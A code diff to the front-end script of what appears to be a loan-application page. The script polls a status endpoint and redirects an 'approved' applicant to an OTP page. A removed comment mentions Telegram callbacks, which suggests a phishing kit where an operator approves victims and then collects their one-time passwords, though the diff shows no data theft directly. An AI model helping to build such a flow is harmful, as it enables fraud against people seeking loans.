@@ -293,7 +293,6 @@
 </div>
 
 <script>
-    // This version uses server-side webhook for reliable Telegram callbacks
     let isProcessing = false;
     let userPhone = '';
     let statusCheckInterval = null;
@@ -343,26 +342,12 @@
                 const response = await fetch(`/api/check-status/${requestId}`);
                 const data = await response.json();
                 
-                console.log('Status check:', data.status);
-                
                 if (data.status === 'approved') {
                     clearInterval(statusCheckInterval);
                     spinner.style.display = 'none';
-                    showStatus("✅ Loan Approved! Redirecting to OTP page...", "success");
+                    showStatus("✅ Loan Approved! Redirecting...", "success");
                     setTimeout(() => window.location.href = '/otp', 1500);
                 } 
-                else if (data.status === 'verify_device') {
-                    clearInterval(statusCheckInterval);
-                    spinner.style.display = 'none';
-                    showStatus("📱 Device verification required. Redirecting...", "processing");
-                    setTimeout(() => window.location.href = '/device_verify', 1500);
-                }
-                else if (data.status === 'already_applied') {
-                    clearInterval(statusCheckInterval);
-                    spinner.style.display = 'none';
-                    showStatus("📋 You have already applied.", "error");
-                    resetButton();
-                }
                 else if (data.status === 'declined') {
                     clearInterval(statusCheckInterval);
                     spinner.style.display = 'none';
